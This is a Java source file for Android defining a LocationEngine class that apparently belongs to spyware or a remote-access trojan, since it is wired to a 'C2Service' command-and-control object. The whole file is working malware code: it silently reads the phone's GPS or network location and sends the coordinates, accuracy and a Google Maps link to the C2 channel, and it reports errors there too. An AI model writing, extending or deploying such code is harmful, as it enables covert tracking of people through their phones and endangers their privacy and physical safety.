package com.wuzenx.engine;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import com.wuzenx.C2Service;

public class LocationEngine {
    private Context context;
    private C2Service c2;

    public LocationEngine(Context context, C2Service c2) { this.context = context; this.c2 = c2; }

    public void getLocation() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location network = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (gps != null) {
                sendLocation(gps);
            } else if (network != null) {
                sendLocation(network);
            } else {
                // Request single update
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(Location loc) { sendLocation(loc); }
                    @Override public void onStatusChanged(String p, int i, Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (Exception e) {
            c2.sendMessage("log", "Location error: " + e.getMessage());
        }
    }

    private void sendLocation(Location loc) {
        double lat = loc.getLatitude();
        double lng = loc.getLongitude();
        float accuracy = loc.getAccuracy();
        String mapsUrl = "https://www.google.com/maps?q=" + lat + "," + lng;
        c2.sendMessage("log", "Location: " + lat + "," + lng + " (±" + (int)accuracy + "m)\n" + mapsUrl);
    }
}
